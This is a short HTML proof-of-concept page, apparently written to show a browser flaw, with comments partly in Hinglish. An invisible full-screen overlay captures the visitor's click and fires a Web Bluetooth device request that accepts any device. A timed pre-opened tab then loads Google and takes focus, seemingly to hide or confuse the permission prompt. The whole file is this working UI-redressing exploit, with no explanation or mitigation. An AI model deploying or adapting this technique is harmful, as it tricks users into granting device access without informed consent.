<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>PoC</title>
<style>
  html, body {
    margin: 0;
    height: 100%;
  }
  #overlay {
    position: fixed;
    inset: 0;
    background: transparent;
    z-index: 9999;
  }
</style>
</head>
<body>

<h1 style="text-align:center;">Click anywhere</h1>
<div id="overlay"></div>

<script>
const overlay = document.getElementById('overlay');

overlay.addEventListener('click', () => {
  try {
    // 1. Pre-open blank tab (important)
    const newTab = window.open('about:blank', '_blank');

    // 2. Trigger Bluetooth (gesture ke andar)
    navigator.bluetooth.requestDevice({
      acceptAllDevices: true
    });

    // 3. 2 sec baad Google open + focus
    setTimeout(() => {
      if (newTab) {
        newTab.location.href = 'https://www.google.com';
        newTab.focus();
      }
    }, 2000);

  } catch (e) {
    console.log(e);
  }
}, { once: true });
</script>

</body>
</html>
